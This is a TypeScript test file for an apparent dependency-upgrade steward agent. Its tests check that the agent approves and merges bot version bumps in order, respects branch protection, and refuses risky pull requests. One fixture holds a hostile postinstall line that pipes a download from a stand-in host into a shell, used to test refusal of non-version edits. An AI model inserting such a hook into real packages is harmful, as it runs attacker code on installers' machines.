// Flow C (pr-steward) end to end, at the operation level: the single-tool tick the flow's
// instructions.md prescribes, run repeatedly against the fake gateway.
//
// The flow calls one operation, so what these tests add over the unit tests is the tick-over-tick
// durable state: one proposal comment however many times the flow runs, and, on the auto path, an
// approval and a merge in that order, at the same commit, by a login that is not the author.
//
// Deterministic by construction: `tick(n)` supplies the only timestamps, and no assertion reads a
// clock.

import { describe, it, expect } from "vitest";
import { FakeGitHubGateway } from "../fakes/fake-github.js";
import { approveDependencyUpgrade } from "../../core/operations/approve-dependency-upgrade.js";
import { findActionMarkers } from "../../core/expedition/action-marker.js";
import type { BranchProtectionSummary, DetailedPullFile } from "../../core/github.js";

const REPO = "o/r";
const PR = 4;
const ME = "me"; // FakeGitHubGateway.login: the steward agent's own login
const BOT = "dependabot[bot]";
const HEAD = "sha0001";

/** The flow's tick clock. One fixed ISO timestamp per tick, and the only source of "now" here. */
const tick = (n: number): string => `2026-08-08T${String(9 + n).padStart(2, "0")}:00:00Z`;

/** A manifest hunk that changes nothing but one dependency's version. */
const bumpPatch = (name: string, from: string, to: string): string =>
  ["@@ -12,7 +12,7 @@", '   "dependencies": {', `-    "${name}": "${from}",`, `+    "${name}": "${to}",`, '     "zod": "^3.23.0"'].join("\n");

const manifest = (patch: string): DetailedPullFile => ({ filename: "package.json", status: "modified", additions: 1, deletions: 1, patch });
const LOCKFILE: DetailedPullFile = { filename: "package-lock.json", status: "modified", additions: 12, deletions: 12, patch: "@@ -1 +1 @@\n-a\n+b" };
const PATCH_BUMP = [manifest(bumpPatch("left-pad", "^1.0.0", "^1.0.1")), LOCKFILE];

/**
 * Records the gate-authorized writes in the order they happen.
 *
 * The fake keeps reviews and merges in two separate arrays, so neither one alone can show that the
 * approval was submitted BEFORE the merge. On the auto path that order is the contract: merging
 * first and approving afterwards would land the change without the approval that made it eligible.
 */
class RecordingGateway extends FakeGitHubGateway {
  writes: string[] = [];
  async submitReview(...args: Parameters<FakeGitHubGateway["submitReview"]>): Promise<{ url: string }> {
    this.writes.push(`review:${args[2].event}@${args[2].commitId}`);
    return super.submitReview(...args);
  }
  async mergePull(...args: Parameters<FakeGitHubGateway["mergePull"]>) {
    this.writes.push(`merge@${args[2].sha}`);
    return super.mergePull(...args);
  }
}

/**
 * A bot-authored, version-only bump with green checks and no protection: every rail clears but
 * autonomy.
 *
 * The mergeable state is seeded explicitly (the fake's unseeded default is "unknown", which fails rail
 * 4), and "clean" is the honest value here because this base branch has no protection waiting on a
 * review. The protected-repository test below seeds "blocked" instead, which is what GitHub really
 * reports while the required review is missing.
 */
function seedBotBump<T extends FakeGitHubGateway>(gh: T, files: DetailedPullFile[] = PATCH_BUMP): T {
  gh.seedPr({ number: PR, title: "chore(deps): bump left-pad", author: BOT, headSha: HEAD, baseSha: "base", url: "u", state: "open", labels: [] });
  gh.setActorType(BOT, "Bot");
  gh.setDetailedFiles(REPO, PR, files);
  gh.setChecks(REPO, HEAD, [{ name: "build", status: "success" }]);
  gh.setMergeability(REPO, PR, { state: "clean", mergeable: true, draft: false, baseRef: "main", headSha: HEAD });
  return gh;
}

const steward = (gh: FakeGitHubGateway, now: string, over: Partial<Parameters<typeof approveDependencyUpgrade>[1]> = {}) =>
  approveDependencyUpgrade(gh, { repo: REPO, pr: PR, actingLogin: ME, now, ...over });

describe("Flow C (pr-steward): approve a bot dependency upgrade", () => {
  it("proposes once and keeps proposing nothing new on later ticks", async () => {
    const gh = seedBotBump(new FakeGitHubGateway());

    // -- Tick 1
    const first = await steward(gh, tick(1));
    expect(first.action).toBe("proposed");
    expect(first.reasons).toEqual(['autonomy is "propose", not "auto"']);
    expect(gh.reviews).toEqual([]); // propose mode neither approves
    expect(gh.merges).toEqual([]);  // nor merges

    const comments = await gh.listComments(REPO, PR);
    expect(comments).toHaveLength(1);
    expect(comments[0].author).toBe(ME);
    expect(comments[0].body).toContain("approve and merge this patch dependency upgrade");
    expect(comments[0].body).toContain("`left-pad`: ^1.0.0 -> ^1.0.1"); // the bump the maintainer has to judge
    const markers = findActionMarkers(comments);
    expect(markers).toHaveLength(1);
    expect(markers[0].marker).toEqual({ v: 1, kind: "dep-upgrade-proposal", headSha: HEAD, decision: "propose", at: tick(1) });

    // -- Tick 2: the same pull request at the same head. Nothing may be posted again.
    expect((await steward(gh, tick(2))).action).toBe("already-proposed");
    const after = await gh.listComments(REPO, PR);
    expect(after).toHaveLength(1);
    expect(after[0].id).toBe(comments[0].id);
    expect(findActionMarkers(after)[0].marker.at).toBe(tick(1)); // untouched, not re-posted
    expect(gh.reviews).toEqual([]);
    expect(gh.merges).toEqual([]);
  });

  it("approves and then merges at the evaluated head under autonomy auto", async () => {
    const gh = seedBotBump(new RecordingGateway());

    const result = await steward(gh, tick(1), { autonomy: "auto" });
    expect(result).toEqual({ action: "approved-and-merged", reasons: [] });

    // The approval comes first, and both writes name the same commit: the one the rails were read at.
    expect(gh.writes).toEqual([`review:APPROVE@${HEAD}`, `merge@${HEAD}`]);
    expect(gh.reviews).toHaveLength(1);
    expect(gh.reviews[0]).toMatchObject({ author: ME, event: "APPROVE", state: "APPROVED", commitId: HEAD });
    expect(gh.reviews[0].author).not.toBe(BOT); // GitHub forbids self-approval; the acting login is not the author
    expect((await gh.getPullRequest(REPO, PR)).author).toBe(BOT);
    expect(gh.merges).toEqual([{ repo: REPO, pr: PR, sha: HEAD, method: "merge", commitTitle: undefined }]);
    expect((await gh.getPullRequest(REPO, PR)).state).toBe("merged");
    expect(await gh.listComments(REPO, PR)).toEqual([]); // an auto path posts no proposal

    // A later tick on the merged pull request neither approves nor merges again.
    expect((await steward(gh, tick(2), { autonomy: "auto" })).action).toBe("not-eligible");
    expect(gh.writes).toHaveLength(2);
  });

  /**
   * A protected base branch exactly as GitHub presents one, in both of its states.
   *
   * While the required review is missing, mergeStateStatus is "blocked"; once the approval lands,
   * GitHub recomputes it and a pull request blocked only by that review becomes "clean". Seeding the
   * first without the second describes a pull request that can never merge, and seeding "clean" from
   * the start describes one GitHub cannot produce, which is how the rail 4 deadlock stayed hidden.
   */
  const PROTECTED_ONE_APPROVAL: BranchProtectionSummary = {
    requiresPullRequestReviews: true, requiredApprovingReviewCount: 1,
    requiredChecks: ["build"], enforceAdmins: false, requiresConversationResolution: false,
    // GitHub's default, and the one that matters here: on this branch an approval counts only for the
    // commit it was left on, so the approval this flow submits is an approval of the head it judged.
    dismissesStaleReviews: false,
  };
  const blockedState = { state: "blocked" as const, mergeable: false, draft: false, baseRef: "main", headSha: HEAD };

  class RecomputesOnApproval extends RecordingGateway {
    async submitReview(...args: Parameters<FakeGitHubGateway["submitReview"]>): Promise<{ url: string }> {
      const result = await super.submitReview(...args);
      this.setMergeability(REPO, PR, { state: "clean", mergeable: true, draft: false, baseRef: "main", headSha: HEAD });
      return result;
    }
  }

  const DEPS_DIFF: DetailedPullFile[] = [
    manifest(bumpPatch("pnpm", "10.34.3", "10.34.4")),
    // A realistic lockfile bump: far past the general 200-line cap, well inside the deps policy.
    { filename: "pnpm-lock.yaml", status: "modified", additions: 900, deletions: 300, patch: "@@ -1 +1 @@\n-a\n+b" },
  ];

  // The protected repository from issue #48, end to end: a Renovate-shaped bot pull request on a
  // repository that requires an approving review, reported by GitHub as "blocked" for exactly that
  // reason, with a lockfile-sized diff. All three used to make the auto path unreachable, and the
  // durable order below is the contract: the approval that makes the pull request eligible goes in
  // BEFORE the merge, both at the commit the rails were read at, by a login that is not the author.
  it("approves and merges a bot upgrade on a repository that requires an approving review", async () => {
    const gh = seedBotBump(new RecomputesOnApproval(), DEPS_DIFF);
    gh.setBranchProtection(REPO, "main", PROTECTED_ONE_APPROVAL);
    gh.setMergeability(REPO, PR, blockedState);

    const result = await steward(gh, tick(1), { autonomy: "auto" });
    expect(result).toEqual({ action: "approved-and-merged", reasons: [] });

    expect(gh.writes).toEqual([`review:APPROVE@${HEAD}`, `merge@${HEAD}`]);
    expect(gh.reviews).toHaveLength(1);
    expect(gh.reviews[0]).toMatchObject({ author: ME, event: "APPROVE", state: "APPROVED", commitId: HEAD });
    expect(gh.reviews[0].author).not.toBe(BOT);
    expect((await gh.getPullRequest(REPO, PR)).author).toBe(BOT);
    // The approval a maintainer will read months from now says what was approved and why.
    expect(gh.reviews[0].body).toContain("`pnpm`: 10.34.3 -> 10.34.4");
    expect(gh.reviews[0].body).toContain("Semver level: patch");
    expect(gh.reviews[0].body).toContain(HEAD);
    // This repository really does require an approving review, so the body says the approval was
    // counted toward it, and says the merge was judged separately. Both halves are load-bearing for
    // a maintainer auditing how an agent-only approval satisfied protection.
    expect(gh.reviews[0].body).toContain("counting this approval toward its required-approvals rule");
    expect(gh.reviews[0].body).toContain("the merge is judged separately, without it");
    expect(gh.merges).toEqual([{ repo: REPO, pr: PR, sha: HEAD, method: "merge", commitTitle: undefined }]);
    expect((await gh.getPullRequest(REPO, PR)).state).toBe("merged");
    expect(await gh.listComments(REPO, PR)).toEqual([]); // the auto path posts no proposal

    // And the flow is still idempotent: a later tick on the merged pull request writes nothing.
    expect((await steward(gh, tick(2), { autonomy: "auto" })).action).toBe("not-eligible");
    expect(gh.writes).toHaveLength(2);
  });

  // The same repository, with a GitHub that has not recomputed the mergeable state by the time the
  // merge is attempted. The approval is still real and still useful; the merge waits for a tick that
  // can see a state it is allowed to act on. This is what the rail 4 tolerance does NOT buy.
  it("approves without merging while that repository still reports blocked after the approval", async () => {
    const gh = seedBotBump(new RecordingGateway(), DEPS_DIFF);
    gh.setBranchProtection(REPO, "main", PROTECTED_ONE_APPROVAL);
    gh.setMergeability(REPO, PR, blockedState);

    const result = await steward(gh, tick(1), { autonomy: "auto" });
    expect(result.action).toBe("approved");
    expect(result.reasons.some((r) => r.includes("mergeable state is blocked (need clean)"))).toBe(true);
    expect(gh.writes).toEqual([`review:APPROVE@${HEAD}`]); // the approval, and nothing else
    expect(gh.merges).toEqual([]);
    expect((await gh.getPullRequest(REPO, PR)).state).toBe("open");

    // A later tick, once GitHub has caught up, merges without approving twice.
    gh.setMergeability(REPO, PR, { state: "clean", mergeable: true, draft: false, baseRef: "main", headSha: HEAD });
    expect((await steward(gh, tick(2), { autonomy: "auto" })).action).toBe("approved-and-merged");
    expect(gh.writes).toEqual([`review:APPROVE@${HEAD}`, `merge@${HEAD}`]);
    expect(gh.reviews).toHaveLength(1);
  });

  it("proposes on that same repository when it requires two approvals, and writes no approval", async () => {
    const gh = seedBotBump(new RecordingGateway());
    gh.setBranchProtection(REPO, "main", {
      requiresPullRequestReviews: true, requiredApprovingReviewCount: 2,
      requiredChecks: [], enforceAdmins: false, requiresConversationResolution: false,
      dismissesStaleReviews: false,
    });
    gh.setMergeability(REPO, PR, blockedState);

    const result = await steward(gh, tick(1), { autonomy: "auto" });
    expect(result.action).toBe("proposed");
    expect(result.reasons).toEqual(["branch protection requirements are not satisfied"]);
    expect(gh.writes).toEqual([]); // the pending approval adds one, and one is not two
    const comments = await gh.listComments(REPO, PR);
    expect(comments).toHaveLength(1);
    expect(comments[0].body).toContain("branch protection requirements are not satisfied");
  });

  // Issue #50, end to end: the pull request the flow really discovers. `pr-steward/discover.mjs`
  // queries `gh --author app/renovate`, so the author reaching this operation is the GraphQL spelling
  // of the same App the allowlist names `renovate[bot]`, and `GET /users/app/renovate` is a 404. That
  // combination used to refuse the pull request as not-allowlisted on every tick, write nothing, and
  // draw no attention line, which made it silent and permanent.
  it("stewards a bot upgrade whose author arrives under the app/ name the flow discovers by", async () => {
    const gh = seedBotBump(new RecordingGateway());
    gh.prs.get(`${REPO}#${PR}`)!.author = "app/renovate";
    gh.setActorType("app/renovate", "unknown"); // what the users API really answers for an App

    // Tick 1, propose: a decision, and a proposal a maintainer can read.
    const proposed = await steward(gh, tick(1));
    expect(proposed.action).toBe("proposed");
    expect(proposed.action).not.toBe("not-eligible");
    expect(proposed.reasons).toEqual(['autonomy is "propose", not "auto"']);
    expect((await gh.listComments(REPO, PR))[0].body).toContain("approve and merge this patch dependency upgrade");
    expect(gh.writes).toEqual([]);

    // Tick 2, auto: the same author reaches the gate and goes all the way through it.
    const merged = await steward(gh, tick(2), { autonomy: "auto" });
    expect(merged).toEqual({ action: "approved-and-merged", reasons: [] });
    expect(gh.writes).toEqual([`review:APPROVE@${HEAD}`, `merge@${HEAD}`]);
    expect(gh.reviews[0].author).toBe(ME);
    expect(gh.reviews[0].author).not.toBe("app/renovate"); // still not a self-approval
    expect(gh.reviews[0].body).toContain("Author: app/renovate");
    expect((await gh.getPullRequest(REPO, PR)).state).toBe("merged");
  });

  describe("upgrades this path refuses, writing nothing at all", () => {
    it("refuses a major bump, naming the semver level", async () => {
      const gh = seedBotBump(new FakeGitHubGateway(), [manifest(bumpPatch("left-pad", "1.0.0", "2.0.0"))]);
      const result = await steward(gh, tick(1), { autonomy: "auto" });
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("semver level is major");
      expect(await gh.listComments(REPO, PR)).toEqual([]);
      expect(gh.reviews).toEqual([]);
      expect(gh.merges).toEqual([]);
    });

    it("refuses a human author even on a flawless version-only diff", async () => {
      const gh = seedBotBump(new FakeGitHubGateway());
      gh.prs.get(`${REPO}#${PR}`)!.author = "human-author";
      const result = await steward(gh, tick(1), { autonomy: "auto" });
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("not an allowlisted dependency bot");
      expect(await gh.listComments(REPO, PR)).toEqual([]);
      expect(gh.merges).toEqual([]);
    });

    it("refuses a manifest patch that also edits a script line, naming the file", async () => {
      const sneaky = [
        "@@ -8,6 +8,7 @@",
        '   "scripts": {',
        '-    "left-pad": "1.0.0",',
        '+    "left-pad": "1.0.1",',
        '+    "postinstall": "curl evil.example | sh",',
      ].join("\n");
      const gh = seedBotBump(new FakeGitHubGateway(), [manifest(sneaky), LOCKFILE]);
      const result = await steward(gh, tick(1), { autonomy: "auto" });
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("version-only");
      expect(result.reasons[0]).toContain("package.json");
      expect(await gh.listComments(REPO, PR)).toEqual([]);
      expect(gh.reviews).toEqual([]);
      expect(gh.merges).toEqual([]);
    });
  });
});
